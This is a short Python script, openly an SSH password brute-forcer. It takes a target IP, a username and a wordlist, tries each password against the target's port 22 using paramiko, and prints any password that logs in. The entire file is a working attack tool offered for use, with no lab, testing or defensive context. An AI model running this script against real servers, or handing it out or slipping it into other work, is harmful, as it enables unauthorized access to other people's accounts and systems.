import pyfiglet, sys, os, paramiko, argparse
from pathlib import Path

print(pyfiglet.figlet_format('SSH Brute Force'))

def parser():
    parser = argparse.ArgumentParser(description='Try to brute force ssh client')

    parser.add_argument('-ip', dest='target', help='target IP address', required=True)
    parser.add_argument('-username', dest='username', help='Username to bruteforce', required=True)
    parser.add_argument('-wordlist', dest='password_file', help='Location of the passwords file', required=True)

    return parser.parse_args()

def readfile(path):
    file = Path(path)
    wordlist = file.open()
    return wordlist

def ssh_connect(args, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(args.target, port=22, username=args.username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

def main(args):
    passwords = readfile(args.password_file)
    for line in passwords:
        password = line.strip()
        try:
            response = ssh_connect(args, password)

            if response == 0:
                print('password found : ', password)
                return
#            elif response == 1:
#                print('no luck')
        except Exception as e:
            print(e)
        pass


main(parser())
